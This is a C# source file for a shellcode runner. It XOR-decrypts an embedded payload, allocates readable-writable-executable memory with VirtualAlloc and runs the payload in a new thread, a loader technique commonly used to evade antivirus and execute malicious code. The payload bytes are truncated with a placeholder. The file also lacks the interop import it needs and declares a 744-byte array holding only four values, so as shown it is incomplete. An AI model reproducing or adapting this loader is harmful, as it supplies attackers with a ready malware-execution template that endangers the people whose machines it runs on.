using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XORShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] encryptedShellcode = new byte[744] { 0xfe, 0x4a, 0x85, 0xe6, /* ... */ };
            
            byte xorKey = 0x02; // XOR decryption key, the same as the one used during encryption

            // Decrypting Shellcode
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                encryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey);
            }

            int size = encryptedShellcode.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(encryptedShellcode, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}